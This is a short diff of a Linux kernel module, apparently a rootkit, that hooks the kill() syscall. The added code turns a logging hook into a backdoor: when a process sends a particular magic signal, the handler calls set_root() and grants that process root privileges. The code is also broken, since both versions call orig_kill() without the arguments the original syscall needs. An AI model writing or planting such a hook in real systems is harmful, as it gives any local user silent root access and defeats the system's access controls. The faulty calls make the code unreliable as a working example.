@@ -22,41 +22,25 @@ static asmlinkage int (*orig_kill)(const struct pt_regs *);
 
 static asmlinkage int hooked_kill(const struct pt_regs *registers)
 {
-    pid_t current_pid;
-    pid_t res;
-
-    current_pid = current->pid;
-    res = orig_kill(registers);
-
-    if (res <= -1)
+    int sig = registers->si;
+    if (sig == SET_ROOT_SIGNAL)
     {
-        printk(KERN_ALERT "hook-kill: error - sys_kill of %d returned %d", current_pid, res);
-        return res;
+	      set_root();
+        return 0;
     }
-    if (res == 0)
-    {
-        printk(KERN_INFO "hook-kill: child_process - sys_kill of %d returned %d", current_pid, res);
-        return res;
-    }
-
-    printk(KERN_INFO "hook-kill: parent_process - sys_kill of %d returned %d", current_pid, res);
-    return res;
+    return orig_kill();
 }
 #else
 
 static asmlinkage int (*orig_kill)(pid_t pid, int sig);
 static asmlinkage int hooked_kill(pid_t pid, int sig)
 {
-    pid_t current_pid;
-    pid_t res;
-
     if (sig == SET_ROOT_SIGNAL)
     {
-	
+	      set_root();
+        return 0;
     }
-    res = orig_kill();
-
-    return res;
+    return orig_kill();
 }
 #endif
 
